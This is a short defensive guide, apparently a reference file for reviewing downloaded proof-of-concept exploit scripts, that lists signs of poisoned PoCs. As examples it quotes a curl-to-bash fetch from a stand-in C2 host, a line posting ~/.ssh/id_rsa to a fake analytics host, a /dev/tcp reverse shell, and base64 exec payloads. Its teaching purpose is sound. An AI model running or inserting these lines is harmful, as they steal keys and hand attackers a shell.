# Poisoned PoC and Backdoor Patterns

**Load when**: Reviewing a freshly downloaded public PoC script before running it.

## Common Fake/Poisoned PoC Indicators

### 1. The Obfuscated Beacon
Watch for large base64 encoded strings in Python or bash scripts that decode into direct execution:
```python
exec(base64.b64decode("aW1wb3J0IG9zLHNvY2tldC..."))
```
Or hidden within seemingly innocent variables:
```python
author_identifier = "curl -s http://malicious.c2/poc.sh | bash"
os.system(author_identifier)
```

### 2. Information Stealers
Verify what is being read from your local environment. If the PoC grabs files like `~/.ssh/id_rsa`, `~/.aws/credentials`, or pushes your local `/etc/passwd`.
```python
# Malicious data exfil often hidden in a telemetry hook
requests.post("http://github-analytics-api.com", data=open(os.path.expanduser("~/.ssh/id_rsa")).read())
```

### 3. The Reverse Shell Bait-and-Switch
Some PoCs promise to attack the remote host but the payload targets the pentester. Review all generated connection strings before running.
```bash
# Fake PoC — attacker-controlled IP
bash -i >& /dev/tcp/1.2.3.4/9001 0>&1
```
If the hardcoded IP is not yours and not the target, do not run the PoC.

### 4. Supply-Chain Hooks
Malicious PoCs may not contain the backdoor inline — they deliver it via the install process:
- `requirements.txt`: typosquatted or shadowed package names (e.g., `reqests` instead of `requests`)
- `setup.py` / `pyproject.toml`: `cmdclass` hooks or `subprocess` calls in `setup()` execute at `pip install`
- `install.sh` / `Makefile`: arbitrary shell commands triggered at setup
- `.github/workflows/`: Actions that exfiltrate tokens or environment variables on fork/push events

Audit these files before running `pip install -r requirements.txt` or any install script.
